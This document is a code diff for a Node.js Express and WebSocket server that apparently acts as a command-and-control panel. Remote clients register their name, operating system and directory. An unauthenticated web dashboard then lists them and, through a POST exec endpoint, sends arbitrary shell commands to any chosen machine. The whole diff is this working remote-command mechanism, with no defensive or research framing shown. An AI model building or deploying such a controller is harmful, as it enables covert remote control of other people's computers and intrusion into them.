@@ -6,40 +6,64 @@ let server = require("http").createServer();
 const express = require("express")
 const app = express()
 const port = 6969
+const bodyParser = require('body-parser');
 
-let clients = {}
+app.set("views", __dirname + "/views");
+app.set("view engine", "ejs");
+
+app.use(bodyParser.urlencoded({extended: false}));
+app.use(express.static("public"))
+
+let clients = [];
 
 app.get("/", (req, res) => {
-    var list = "";
-
-    Object.keys(clients).forEach(function(client) {
-        var c = clients[client];
-        list += `
-            Name: ${client}<br>
-            OS: ${c.os}<br>
-            Path: ${c.path}<br><br>
-        `
-    })
-
-    res.send(list);
+    res.render("dashboard", {
+        clients: clients,
+    });
 })
 
-app.get("/:name/exec/:cmd", (req, res) => {
-    let name = req.params.name;
-    let cmd = req.params.cmd;
+app.get("/:id", (req, res) => {
+    let id = req.params.id;
 
-    let client = clients[name];
+    let client = clientFromId(id);
     if (client) {
-        res.send("Sending command (" + cmd + ") to " + name);
+        res.render("client", {
+            client: client,
+        })
+    } else {
+        res.render("error", {
+            message: "client not found",
+        })
+    }
+})
 
+app.post("/:id/exec", (req, res) => {
+    let id = req.params.id;
+    let cmd = req.body.cmd;
+
+    let client = clientFromId(id);
+    if (client) {
         let instruction = JSON.stringify({
             type: "exec",
             value: cmd,
         })
 
         client.socket.send(instruction)
+
+        res.redirect("/" + client.id);
     }
 })
+
+function clientFromId(id) {
+    for (let i = 0; i < clients.length; i++) {
+        let client = clients[i];
+        if (client.id == id) {
+            return client;
+        }
+    }
+
+    return false;
+}
 
 const wss = new WebSocket.Server({
     server: server,
@@ -63,11 +87,13 @@ wss.on("connection", function(ws, req) {
                 let os = json.os;
                 let path = json.dir;
 
-                clients[name] = {
+                clients.push({
+                    id: clients.length+1,
+                    name: name,
                     os: os,
                     path: path,
                     socket: ws,
-                }
+                });
             } else if (type == "result") {
                 console.log(json);
             } else {
@@ -77,6 +103,15 @@ wss.on("connection", function(ws, req) {
         } else {
             console.log("Not succesful JSON");
             console.log(message);
+        }
+    })
+
+    ws.on("close", function() {
+        for (let i = 0; i < clients.length; i++) {
+            var client = clients[i];
+            if (client.socket == ws) {
+                clients.splice(i, 1);
+            }
         }
     })
 });
